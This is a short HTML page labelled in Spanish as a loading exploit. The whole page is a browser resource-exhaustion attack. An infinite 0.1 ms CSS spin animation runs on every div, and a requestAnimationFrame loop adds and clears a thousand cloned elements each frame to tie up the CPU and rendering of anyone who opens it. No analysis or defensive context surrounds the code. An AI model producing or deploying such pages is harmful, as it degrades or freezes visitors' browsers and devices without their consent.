<!DOCTYPE html>
<html>
<head>
<style>
@keyframes spin {
  from { transform: rotate(0deg); }
  to { transform: rotate(360deg); }
}
div {
  animation: spin 0.1ms infinite;
}
</style>
</head>
<body>
<div id="log" style="background:#111;color:#0f0;padding:1em;font-family:monospace;">
Cargando exploit... (esto puede tardar unos segundos)
</div>
<div id="target"></div>

<script>
const log = document.getElementById("log");
const target = document.getElementById("target");

function crash() {
  try {
    for (let i = 0; i < 1000; i++) {
      let node = document.createElement("div");
      node.textContent = i;
      target.appendChild(node.cloneNode(true));
    }
    target.innerHTML = "";
  } catch (e) {
    log.textContent = "Error: " + e.message;
  }

  requestAnimationFrame(crash);
}

requestAnimationFrame(crash);
</script>
</body>
</html>
